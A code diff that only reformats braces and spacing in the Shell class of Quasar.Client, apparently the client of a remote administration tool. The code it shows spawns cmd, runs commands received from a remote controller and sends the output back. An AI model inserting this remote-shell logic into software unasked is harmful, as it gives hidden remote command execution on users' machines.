@@ -6,13 +6,11 @@ using System.Text;
 using System.Threading;
 using Quasar.Common.Messages;
 
-namespace Quasar.Client.Utilities
-{
+namespace Quasar.Client.Utilities {
     /// <summary>
     /// This class manages a remote shell session.
     /// </summary>
-    public class Shell : IDisposable
-    {
+    public class Shell : IDisposable {
         /// <summary>
         /// The Process of the command-line.
         /// </summary>
@@ -49,20 +47,16 @@ namespace Quasar.Client.Utilities
         /// <summary>
         /// Creates a new session of the Shell
         /// </summary>
-        private void CreateSession()
-        {
-            lock (_readLock)
-            {
+        private void CreateSession() {
+            lock (_readLock) {
                 _read = true;
             }
 
             CultureInfo cultureInfo = CultureInfo.InstalledUICulture;
             _encoding = Encoding.GetEncoding(cultureInfo.TextInfo.OEMCodePage);
 
-            _prc = new Process
-            {
-                StartInfo = new ProcessStartInfo("cmd")
-                {
+            _prc = new Process {
+                StartInfo = new ProcessStartInfo("cmd") {
                     UseShellExecute = false,
                     RedirectStandardInput = true,
                     RedirectStandardOutput = true,
@@ -83,8 +77,7 @@ namespace Quasar.Client.Utilities
             // Change console code page
             ExecuteCommand("chcp " + _encoding.CodePage);
 
-            Program.ConnectClient.Send(new DoShellExecuteResponse
-            {
+            Program.ConnectClient.Send(new DoShellExecuteResponse {
                 Output = Environment.NewLine + ">> New Session created" + Environment.NewLine
             });
         }
@@ -92,8 +85,7 @@ namespace Quasar.Client.Utilities
         /// <summary>
         /// Starts the redirection of input and output
         /// </summary>
-        private void RedirectOutputs()
-        {
+        private void RedirectOutputs() {
             ThreadPool.QueueUserWorkItem((WaitCallback)delegate { RedirectStandardOutput(); });
             ThreadPool.QueueUserWorkItem((WaitCallback)delegate { RedirectStandardError(); });
         }
@@ -104,17 +96,14 @@ namespace Quasar.Client.Utilities
         /// <param name="firstCharRead">The first read char.</param>
         /// <param name="streamReader">The StreamReader to read from.</param>
         /// <param name="isError">True if reading from the error-stream, else False.</param>
-        private void ReadStream(int firstCharRead, StreamReader streamReader, bool isError)
-        {
-            lock (_readStreamLock)
-            {
+        private void ReadStream(int firstCharRead, StreamReader streamReader, bool isError) {
+            lock (_readStreamLock) {
                 StringBuilder streambuffer = new StringBuilder();
 
                 streambuffer.Append((char)firstCharRead);
 
                 // While there are more characters to be read
-                while (streamReader.Peek() > -1)
-                {
+                while (streamReader.Peek() > -1) {
                     // Read the character in the queue
                     var ch = streamReader.Read();
 
@@ -134,8 +123,7 @@ namespace Quasar.Client.Utilities
         /// </summary>
         /// <param name="textbuffer">Contains the contents of the output.</param>
         /// <param name="isError">True if reading from the error-stream, else False.</param>
-        private void SendAndFlushBuffer(ref StringBuilder textbuffer, bool isError)
-        {
+        private void SendAndFlushBuffer(ref StringBuilder textbuffer, bool isError) {
             if (textbuffer.Length == 0) return;
 
             var text = textbuffer.ToString();
@@ -144,7 +132,7 @@ namespace Quasar.Client.Utilities
 
             if (string.IsNullOrEmpty(toSend)) return;
 
-            Program.ConnectClient.Send(new DoShellExecuteResponse {Output = toSend, IsError = isError});
+            Program.ConnectClient.Send(new DoShellExecuteResponse { Output = toSend, IsError = isError });
 
             textbuffer.Length = 0;
         }
@@ -152,37 +140,26 @@ namespace Quasar.Client.Utilities
         /// <summary>
         /// Reads from the standard output-stream.
         /// </summary>
-        private void RedirectStandardOutput()
-        {
-            try
-            {
+        private void RedirectStandardOutput() {
+            try {
                 int ch;
 
                 // The Read() method will block until something is available
-                while (_prc != null && !_prc.HasExited && (ch = _prc.StandardOutput.Read()) > -1)
-                {
+                while (_prc != null && !_prc.HasExited && (ch = _prc.StandardOutput.Read()) > -1) {
                     ReadStream(ch, _prc.StandardOutput, false);
                 }
 
-                lock (_readLock)
-                {
-                    if (_read)
-                    {
+                lock (_readLock) {
+                    if (_read) {
                         _read = false;
                         throw new ApplicationException("session unexpectedly closed");
                     }
                 }
-            }
-            catch (ObjectDisposedException)
-            {
+            } catch (ObjectDisposedException) {
                 // just exit
-            }
-            catch (Exception ex)
-            {
-                if (ex is ApplicationException || ex is InvalidOperationException)
-                {
-                    Program.ConnectClient.Send(new DoShellExecuteResponse
-                    {
+            } catch (Exception ex) {
+                if (ex is ApplicationException || ex is InvalidOperationException) {
+                    Program.ConnectClient.Send(new DoShellExecuteResponse {
                         Output = string.Format(
                             "{0}>> Session unexpectedly closed{0}",
                             Environment.NewLine),
@@ -197,37 +174,26 @@ namespace Quasar.Client.Utilities
         /// <summary>
         /// Reads from the standard error-stream.
         /// </summary>
-        private void RedirectStandardError()
-        {
-            try
-            {
+        private void RedirectStandardError() {
+            try {
                 int ch;
 
                 // The Read() method will block until something is available
-                while (_prc != null && !_prc.HasExited && (ch = _prc.StandardError.Read()) > -1)
-                {
+                while (_prc != null && !_prc.HasExited && (ch = _prc.StandardError.Read()) > -1) {
                     ReadStream(ch, _prc.StandardError, true);
                 }
 
-                lock (_readLock)
-                {
-                    if (_read)
-                    {
+                lock (_readLock) {
+                    if (_read) {
                         _read = false;
                         throw new ApplicationException("session unexpectedly closed");
                     }
                 }
-            }
-            catch (ObjectDisposedException)
-            {
+            } catch (ObjectDisposedException) {
                 // just exit
-            }
-            catch (Exception ex)
-            {
-                if (ex is ApplicationException || ex is InvalidOperationException)
-                {
-                    Program.ConnectClient.Send(new DoShellExecuteResponse
-                    {
+            } catch (Exception ex) {
+                if (ex is ApplicationException || ex is InvalidOperationException) {
+                    Program.ConnectClient.Send(new DoShellExecuteResponse {
                         Output = string.Format(
                             "{0}>> Session unexpectedly closed{0}",
                             Environment.NewLine),
@@ -244,15 +210,13 @@ namespace Quasar.Client.Utilities
         /// </summary>
         /// <param name="command">The command to execute.</param>
         /// <returns>False if execution failed, else True.</returns>
-        public bool ExecuteCommand(string command)
-        {
+        public bool ExecuteCommand(string command) {
             if (_prc == null || _prc.HasExited)
                 CreateSession();
 
             if (_prc == null) return false;
 
-            if (_inputWriter == null)
-            {
+            if (_inputWriter == null) {
                 _inputWriter = new StreamWriter(_prc.StandardInput.BaseStream, _encoding);
             }
 
@@ -268,40 +232,31 @@ namespace Quasar.Client.Utilities
         /// <summary>
         /// Constructor, creates a new session.
         /// </summary>
-        public Shell()
-        {
+        public Shell() {
             CreateSession();
         }
 
         /// <summary>
         /// Releases all resources used by this class.
         /// </summary>
-        public void Dispose()
-        {
+        public void Dispose() {
             Dispose(true);
 
             GC.SuppressFinalize(this);
         }
 
-        protected virtual void Dispose(bool disposing)
-        {
-            if (disposing)
-            {
-                lock (_readLock)
-                {
+        protected virtual void Dispose(bool disposing) {
+            if (disposing) {
+                lock (_readLock) {
                     _read = false;
                 }
 
                 if (_prc == null) return;
 
-                if (!_prc.HasExited)
-                {
-                    try
-                    {
+                if (!_prc.HasExited) {
+                    try {
                         _prc.Kill();
-                    }
-                    catch
-                    {
+                    } catch {
                     }
                 }
                 _inputWriter.Close();
